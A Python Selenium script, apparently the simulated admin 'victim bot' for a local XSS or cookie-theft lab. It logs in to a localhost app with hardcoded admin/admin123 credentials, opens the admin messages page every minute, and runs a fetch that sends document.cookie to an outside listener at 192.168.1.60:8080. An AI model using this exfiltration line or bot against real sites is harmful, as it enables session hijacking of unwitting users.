import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from webdriver_manager.firefox import GeckoDriverManager

# Configuración de opciones para ejecutar en modo headless
options = Options()
options.headless = True  # Ejecutar sin interfaz gráfica
options.add_argument('--disable-gpu')  # Desactivar la GPU (opcional)
options.add_argument('--no-sandbox')  # Requerido para contenedores

# Usando WebDriver Manager para instalar el controlador automáticamente
service = Service(GeckoDriverManager().install())

# Crear una instancia del navegador con el controlador configurado
driver = webdriver.Firefox(service=service, options=options)

LOGIN_URL = "http://localhost:5000/login"
ADMIN_PAGE = "http://localhost:5000/admin/messages"

def ejecutar_tarea():
    # Iniciar sesión
    print("[BOT] Iniciando sesión como admin...")
    driver.get(LOGIN_URL)
    time.sleep(2)

    # Rellenar el formulario de inicio de sesión
    username_field = driver.find_element_by_name("username")
    password_field = driver.find_element_by_name("password")
    login_button = driver.find_element_by_xpath("//button[@type='submit']")

    username_field.send_keys("admin")
    password_field.send_keys("admin123")
    login_button.click()

    time.sleep(2)

    # Visitar la página de mensajes
    print("[BOT] Visitando la página de mensajes...")
    driver.get(ADMIN_PAGE)

    # Ejecutar el script JavaScript para obtener cookies (por ejemplo)
    script = 'fetch("http://192.168.1.60:8080?cookie=" + document.cookie)'
    driver.execute_script(script)

    print("[BOT] Tarea completada.")

# Ejecutar la tarea cada minuto
while True:
    ejecutar_tarea()
    print("[BOT] Esperando 60 segundos para la siguiente ejecución...")
    time.sleep(60)  # Espera 60 segundos antes de ejecutar de nuevo
